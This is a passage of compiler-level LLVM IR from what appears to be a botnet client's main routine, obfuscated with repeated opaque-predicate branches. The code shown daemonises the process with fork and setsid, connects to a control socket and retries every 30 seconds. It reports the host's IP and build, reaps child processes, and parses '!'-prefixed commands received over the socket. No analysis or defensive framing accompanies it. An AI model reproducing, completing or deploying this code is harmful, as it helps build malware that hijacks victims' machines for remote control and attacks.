  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %171
  %180 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %181 = call i32 @feof(%struct._IO_FILE* %180) #2
  %182 = icmp ne i32 %181, 0
  %183 = xor i1 %182, true
  %184 = load i32, i32* @x.131
  %185 = load i32, i32* @y.132
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart227, label %originalBB21alteredBB

originalBBpart227:                                ; preds = %originalBB21
  br i1 %183, label %192, label %220

; <label>:192:                                    ; preds = %originalBBpart227
  %193 = getelementptr inbounds [1024 x i8], [1024 x i8]* %17, i32 0, i32 0
  %194 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %195 = call i8* @fgets(i8* %193, i32 1024, %struct._IO_FILE* %194)
  %196 = getelementptr inbounds [1024 x i8], [1024 x i8]* %17, i32 0, i32 0
  %197 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i32 0, i32 0
  %198 = call i32 @strcasecmp(i8* %196, i8* %197) #10
  %199 = icmp ne i32 %198, 0
  br i1 %199, label %219, label %200

; <label>:200:                                    ; preds = %192
  %201 = load i32, i32* @x.131
  %202 = load i32, i32* @y.132
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %200
  %209 = load i32, i32* %19, align 4
  %210 = add nsw i32 %209, 1
  store i32 %210, i32* %19, align 4
  %211 = load i32, i32* @x.131
  %212 = load i32, i32* @y.132
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %219

; <label>:219:                                    ; preds = %originalBBpart231, %192
  br label %171

; <label>:220:                                    ; preds = %originalBBpart227
  %221 = load i32, i32* @x.131
  %222 = load i32, i32* @y.132
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %220
  %229 = load i32, i32* %19, align 4
  %230 = icmp eq i32 %229, 0
  %231 = load i32, i32* @x.131
  %232 = load i32, i32* @y.132
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %230, label %239, label %285

; <label>:239:                                    ; preds = %originalBBpart235
  %240 = load i32, i32* @x.131
  %241 = load i32, i32* @y.132
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %239
  %248 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %249 = call i32 @fclose(%struct._IO_FILE* %248)
  %250 = load i8*, i8** %14, align 8
  %251 = call %struct._IO_FILE* @fopen(i8* %250, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.483, i32 0, i32 0))
  store %struct._IO_FILE* %251, %struct._IO_FILE** %20, align 8
  %252 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %253 = icmp ne %struct._IO_FILE* %252, null
  %254 = load i32, i32* @x.131
  %255 = load i32, i32* @y.132
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %253, label %262, label %268

; <label>:262:                                    ; preds = %originalBBpart239
  %263 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i32 0, i32 0
  %264 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %265 = call i32 @fputs(i8* %263, %struct._IO_FILE* %264)
  %266 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %267 = call i32 @fclose(%struct._IO_FILE* %266)
  br label %268

; <label>:268:                                    ; preds = %262, %originalBBpart239
  %269 = load i32, i32* @x.131
  %270 = load i32, i32* @y.132
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %268
  %277 = load i32, i32* @x.131
  %278 = load i32, i32* @y.132
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %304

; <label>:285:                                    ; preds = %originalBBpart235
  %286 = load i32, i32* @x.131
  %287 = load i32, i32* @y.132
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %285
  %294 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %295 = call i32 @fclose(%struct._IO_FILE* %294)
  %296 = load i32, i32* @x.131
  %297 = load i32, i32* @y.132
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %304

; <label>:304:                                    ; preds = %originalBBpart247, %originalBBpart243
  br label %308

; <label>:305:                                    ; preds = %104
  %306 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %307 = call i32 @fclose(%struct._IO_FILE* %306)
  br label %308

; <label>:308:                                    ; preds = %305, %304
  br label %309

; <label>:309:                                    ; preds = %308, %101
  %310 = call i32 @getOurIP()
  %311 = call i32 @fork() #2
  store i32 %311, i32* %9, align 4
  %312 = icmp ne i32 %311, 0
  br i1 %312, label %313, label %316

; <label>:313:                                    ; preds = %309
  %314 = load i32, i32* %9, align 4
  %315 = call i32 @waitpid(i32 %314, i32* %11, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:316:                                    ; preds = %309
  %317 = load i32, i32* %9, align 4
  %318 = icmp ne i32 %317, 0
  br i1 %318, label %379, label %319

; <label>:319:                                    ; preds = %316
  %320 = load i32, i32* @x.131
  %321 = load i32, i32* @y.132
  %322 = sub i32 %320, 1
  %323 = mul i32 %320, %322
  %324 = urem i32 %323, 2
  %325 = icmp eq i32 %324, 0
  %326 = icmp slt i32 %321, 10
  %327 = or i1 %325, %326
  br i1 %327, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %319
  %328 = call i32 @fork() #2
  store i32 %328, i32* %10, align 4
  %329 = icmp ne i32 %328, 0
  %330 = load i32, i32* @x.131
  %331 = load i32, i32* @y.132
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %329, label %338, label %355

; <label>:338:                                    ; preds = %originalBBpart251
  %339 = load i32, i32* @x.131
  %340 = load i32, i32* @y.132
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %338
  call void @exit(i32 0) #14
  %347 = load i32, i32* @x.131
  %348 = load i32, i32* @y.132
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  unreachable

; <label>:355:                                    ; preds = %originalBBpart251
  %356 = load i32, i32* @x.131
  %357 = load i32, i32* @y.132
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %355
  %364 = load i32, i32* %10, align 4
  %365 = icmp ne i32 %364, 0
  %366 = load i32, i32* @x.131
  %367 = load i32, i32* @y.132
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %365, label %375, label %374

; <label>:374:                                    ; preds = %originalBBpart259
  br label %377

; <label>:375:                                    ; preds = %originalBBpart259
  %376 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.484, i32 0, i32 0))
  br label %377

; <label>:377:                                    ; preds = %375, %374
  br label %378

; <label>:378:                                    ; preds = %377
  br label %381

; <label>:379:                                    ; preds = %316
  %380 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.484, i32 0, i32 0))
  br label %381

; <label>:381:                                    ; preds = %379, %378
  %382 = load i32, i32* @x.131
  %383 = load i32, i32* @y.132
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %381
  %390 = load i32, i32* @x.131
  %391 = load i32, i32* @y.132
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %398

; <label>:398:                                    ; preds = %originalBBpart263
  %399 = load i32, i32* @x.131
  %400 = load i32, i32* @y.132
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %398
  %407 = call i32 @setsid() #2
  %408 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #2
  %409 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  %410 = load i32, i32* @x.131
  %411 = load i32, i32* @y.132
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br label %418

; <label>:418:                                    ; preds = %originalBBpart2162, %originalBBpart275, %originalBBpart267
  %419 = load i32, i32* @x.131
  %420 = load i32, i32* @y.132
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %418
  %427 = call i32 @initConnection()
  %428 = icmp ne i32 %427, 0
  %429 = load i32, i32* @x.131
  %430 = load i32, i32* @y.132
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %428, label %437, label %455

; <label>:437:                                    ; preds = %originalBBpart271
  %438 = load i32, i32* @x.131
  %439 = load i32, i32* @y.132
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %437
  %446 = call i32 @sleep(i32 30)
  %447 = load i32, i32* @x.131
  %448 = load i32, i32* @y.132
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %418

; <label>:455:                                    ; preds = %originalBBpart271
  %456 = load i32, i32* @x.131
  %457 = load i32, i32* @y.132
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %455
  %464 = load i32, i32* @mainCommSock, align 4
  %465 = call i8* @getBuild()
  %466 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %467 = call i8* @inet_ntoa(i32 %466) #2
  %468 = call i32 (i32, i8*, ...) @sockprintf(i32 %464, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.485, i32 0, i32 0), i8* %465, i8* %467)
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  %469 = load i32, i32* @x.131
  %470 = load i32, i32* @y.132
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %477

; <label>:477:                                    ; preds = %1040, %originalBBpart2134, %originalBBpart2118, %628, %originalBBpart279
  %478 = load i32, i32* @mainCommSock, align 4
  %479 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %480 = call i32 @recvLine(i32 %478, i8* %479, i32 4096)
  store i32 %480, i32* %22, align 4
  %481 = icmp ne i32 %480, -1
  br i1 %481, label %482, label %1041

; <label>:482:                                    ; preds = %477
  %483 = load i32, i32* @x.131
  %484 = load i32, i32* @y.132
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %482
  store i32 0, i32* %23, align 4
  %491 = load i32, i32* @x.131
  %492 = load i32, i32* @y.132
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br label %499

; <label>:499:                                    ; preds = %originalBBpart2106, %originalBBpart283
  %500 = load i32, i32* %23, align 4
  %501 = load i32, i32* @numpids, align 4
  %502 = icmp slt i32 %500, %501
  br i1 %502, label %503, label %619

; <label>:503:                                    ; preds = %499
  %504 = load i32*, i32** @pids, align 8
  %505 = load i32, i32* %23, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds i32, i32* %504, i64 %506
  %508 = load i32, i32* %507, align 4
  %509 = call i32 @waitpid(i32 %508, i32* null, i32 1)
  %510 = icmp sgt i32 %509, 0
  br i1 %510, label %511, label %599

; <label>:511:                                    ; preds = %503
  %512 = load i32, i32* %23, align 4
  %513 = add nsw i32 %512, 1
  store i32 %513, i32* %25, align 4
  br label %514

; <label>:514:                                    ; preds = %originalBBpart292, %511
  %515 = load i32, i32* %25, align 4
  %516 = load i32, i32* @numpids, align 4
  %517 = icmp ult i32 %515, %516
  br i1 %517, label %518, label %548

; <label>:518:                                    ; preds = %514
  %519 = load i32*, i32** @pids, align 8
  %520 = load i32, i32* %25, align 4
  %521 = zext i32 %520 to i64
  %522 = getelementptr inbounds i32, i32* %519, i64 %521
  %523 = load i32, i32* %522, align 4
  %524 = load i32*, i32** @pids, align 8
  %525 = load i32, i32* %25, align 4
  %526 = sub i32 %525, 1
  %527 = zext i32 %526 to i64
  %528 = getelementptr inbounds i32, i32* %524, i64 %527
  store i32 %523, i32* %528, align 4
  br label %529

; <label>:529:                                    ; preds = %518
  %530 = load i32, i32* @x.131
  %531 = load i32, i32* @y.132
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %529
  %538 = load i32, i32* %25, align 4
  %539 = add i32 %538, 1
  store i32 %539, i32* %25, align 4
  %540 = load i32, i32* @x.131
  %541 = load i32, i32* @y.132
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBBpart292, label %originalBB85alteredBB

originalBBpart292:                                ; preds = %originalBB85
  br label %514

; <label>:548:                                    ; preds = %514
  %549 = load i32*, i32** @pids, align 8
  %550 = load i32, i32* %25, align 4
  %551 = sub i32 %550, 1
  %552 = zext i32 %551 to i64
  %553 = getelementptr inbounds i32, i32* %549, i64 %552
  store i32 0, i32* %553, align 4
  %554 = load i32, i32* @numpids, align 4
  %555 = add nsw i32 %554, -1
  store i32 %555, i32* @numpids, align 4
  %556 = load i32, i32* @numpids, align 4
  %557 = add nsw i32 %556, 1
  %558 = sext i32 %557 to i64
  %559 = mul i64 %558, 4
  %560 = call noalias i8* @malloc(i64 %559) #2
  %561 = bitcast i8* %560 to i32*
  store i32* %561, i32** %24, align 8
  store i32 0, i32* %25, align 4
  br label %562

; <label>:562:                                    ; preds = %592, %548
  %563 = load i32, i32* %25, align 4
  %564 = load i32, i32* @numpids, align 4
  %565 = icmp ult i32 %563, %564
  br i1 %565, label %566, label %595

; <label>:566:                                    ; preds = %562
  %567 = load i32, i32* @x.131
  %568 = load i32, i32* @y.132
  %569 = sub i32 %567, 1
  %570 = mul i32 %567, %569
  %571 = urem i32 %570, 2
  %572 = icmp eq i32 %571, 0
  %573 = icmp slt i32 %568, 10
  %574 = or i1 %572, %573
  br i1 %574, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %566
  %575 = load i32*, i32** @pids, align 8
  %576 = load i32, i32* %25, align 4
  %577 = zext i32 %576 to i64
  %578 = getelementptr inbounds i32, i32* %575, i64 %577
  %579 = load i32, i32* %578, align 4
  %580 = load i32*, i32** %24, align 8
  %581 = load i32, i32* %25, align 4
  %582 = zext i32 %581 to i64
  %583 = getelementptr inbounds i32, i32* %580, i64 %582
  store i32 %579, i32* %583, align 4
  %584 = load i32, i32* @x.131
  %585 = load i32, i32* @y.132
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %592

; <label>:592:                                    ; preds = %originalBBpart296
  %593 = load i32, i32* %25, align 4
  %594 = add i32 %593, 1
  store i32 %594, i32* %25, align 4
  br label %562

; <label>:595:                                    ; preds = %562
  %596 = load i32*, i32** @pids, align 8
  %597 = bitcast i32* %596 to i8*
  call void @free(i8* %597) #2
  %598 = load i32*, i32** %24, align 8
  store i32* %598, i32** @pids, align 8
  br label %599

; <label>:599:                                    ; preds = %595, %503
  br label %600

; <label>:600:                                    ; preds = %599
  %601 = load i32, i32* @x.131
  %602 = load i32, i32* @y.132
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %600
  %609 = load i32, i32* %23, align 4
  %610 = add nsw i32 %609, 1
  store i32 %610, i32* %23, align 4
  %611 = load i32, i32* @x.131
  %612 = load i32, i32* @y.132
  %613 = sub i32 %611, 1
  %614 = mul i32 %611, %613
  %615 = urem i32 %614, 2
  %616 = icmp eq i32 %615, 0
  %617 = icmp slt i32 %612, 10
  %618 = or i1 %616, %617
  br i1 %618, label %originalBBpart2106, label %originalBB98alteredBB

originalBBpart2106:                               ; preds = %originalBB98
  br label %499

; <label>:619:                                    ; preds = %499
  %620 = load i32, i32* %22, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 %621
  store i8 0, i8* %622, align 1
  %623 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  call void @trim(i8* %623)
  %624 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %625 = call i8* @strstr(i8* %624, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0)) #10
  %626 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %627 = icmp eq i8* %625, %626
  br i1 %627, label %628, label %631

; <label>:628:                                    ; preds = %619
  %629 = load i32, i32* @mainCommSock, align 4
  %630 = call i32 (i32, i8*, ...) @sockprintf(i32 %629, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.486, i32 0, i32 0))
  br label %477

; <label>:631:                                    ; preds = %619
  %632 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %633 = call i8* @strstr(i8* %632, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.487, i32 0, i32 0)) #10
  %634 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %635 = icmp eq i8* %633, %634
  br i1 %635, label %636, label %660

; <label>:636:                                    ; preds = %631
  %637 = load i32, i32* %12, align 4
  %638 = add nsw i32 %637, 1
  store i32 %638, i32* %12, align 4
  %639 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.488, i32 0, i32 0))
  %640 = load i32, i32* %12, align 4
  %641 = icmp sgt i32 %640, 20
  br i1 %641, label %642, label %643

; <label>:642:                                    ; preds = %636
  call void @exit(i32 0) #14
  unreachable

; <label>:643:                                    ; preds = %636
  %644 = load i32, i32* @x.131
  %645 = load i32, i32* @y.132
  %646 = sub i32 %644, 1
  %647 = mul i32 %644, %646
  %648 = urem i32 %647, 2
  %649 = icmp eq i32 %648, 0
  %650 = icmp slt i32 %645, 10
  %651 = or i1 %649, %650
  br i1 %651, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %643
  %652 = load i32, i32* @x.131
  %653 = load i32, i32* @y.132
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br label %1041

; <label>:660:                                    ; preds = %631
  %661 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  store i8* %661, i8** %26, align 8
  %662 = load i8*, i8** %26, align 8
  %663 = load i8, i8* %662, align 1
  %664 = zext i8 %663 to i32
  %665 = icmp eq i32 %664, 33
  br i1 %665, label %666, label %1040

; <label>:666:                                    ; preds = %660
  %667 = load i8*, i8** %26, align 8
  %668 = getelementptr inbounds i8, i8* %667, i64 1
  store i8* %668, i8** %27, align 8
  br label %669

; <label>:669:                                    ; preds = %697, %666
  %670 = load i32, i32* @x.131
  %671 = load i32, i32* @y.132
  %672 = sub i32 %670, 1
  %673 = mul i32 %670, %672
  %674 = urem i32 %673, 2
  %675 = icmp eq i32 %674, 0
  %676 = icmp slt i32 %671, 10
  %677 = or i1 %675, %676
  br i1 %677, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %669
  %678 = load i8*, i8** %27, align 8
  %679 = load i8, i8* %678, align 1
  %680 = zext i8 %679 to i32
  %681 = icmp ne i32 %680, 32
  %682 = load i32, i32* @x.131
  %683 = load i32, i32* @y.132
  %684 = sub i32 %682, 1
  %685 = mul i32 %682, %684
  %686 = urem i32 %685, 2
  %687 = icmp eq i32 %686, 0
  %688 = icmp slt i32 %683, 10
  %689 = or i1 %687, %688
  br i1 %689, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br i1 %681, label %690, label %695

; <label>:690:                                    ; preds = %originalBBpart2114
  %691 = load i8*, i8** %27, align 8
  %692 = load i8, i8* %691, align 1
  %693 = zext i8 %692 to i32
  %694 = icmp ne i32 %693, 0
  br label %695

; <label>:695:                                    ; preds = %690, %originalBBpart2114
  %696 = phi i1 [ false, %originalBBpart2114 ], [ %694, %690 ]
  br i1 %696, label %697, label %700

; <label>:697:                                    ; preds = %695
  %698 = load i8*, i8** %27, align 8
  %699 = getelementptr inbounds i8, i8* %698, i32 1
  store i8* %699, i8** %27, align 8
  br label %669

; <label>:700:                                    ; preds = %695
  %701 = load i8*, i8** %27, align 8
  %702 = load i8, i8* %701, align 1
  %703 = zext i8 %702 to i32
  %704 = icmp eq i32 %703, 0
  br i1 %704, label %705, label %722

; <label>:705:                                    ; preds = %700
  %706 = load i32, i32* @x.131
  %707 = load i32, i32* @y.132
  %708 = sub i32 %706, 1
  %709 = mul i32 %706, %708
  %710 = urem i32 %709, 2
  %711 = icmp eq i32 %710, 0
  %712 = icmp slt i32 %707, 10
  %713 = or i1 %711, %712
  br i1 %713, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %705
  %714 = load i32, i32* @x.131
  %715 = load i32, i32* @y.132
  %716 = sub i32 %714, 1
  %717 = mul i32 %714, %716
  %718 = urem i32 %717, 2
  %719 = icmp eq i32 %718, 0
  %720 = icmp slt i32 %715, 10
  %721 = or i1 %719, %720
  br i1 %721, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %477

; <label>:722:                                    ; preds = %700
  %723 = load i8*, i8** %27, align 8
  store i8 0, i8* %723, align 1
  %724 = load i8*, i8** %26, align 8
  %725 = getelementptr inbounds i8, i8* %724, i64 1
  store i8* %725, i8** %27, align 8
  %726 = load i8*, i8** %26, align 8
  %727 = load i8*, i8** %27, align 8
  %728 = call i64 @strlen(i8* %727) #10
  %729 = getelementptr inbounds i8, i8* %726, i64 %728
  %730 = getelementptr inbounds i8, i8* %729, i64 2
  store i8* %730, i8** %26, align 8
  br label %731

; <label>:731:                                    ; preds = %751, %722
  %732 = load i8*, i8** %26, align 8
  %733 = load i8*, i8** %26, align 8
  %734 = call i64 @strlen(i8* %733) #10
  %735 = sub i64 %734, 1
  %736 = getelementptr inbounds i8, i8* %732, i64 %735
  %737 = load i8, i8* %736, align 1
  %738 = zext i8 %737 to i32
  %739 = icmp eq i32 %738, 10
  br i1 %739, label %749, label %740

; <label>:740:                                    ; preds = %731
  %741 = load i8*, i8** %26, align 8
  %742 = load i8*, i8** %26, align 8
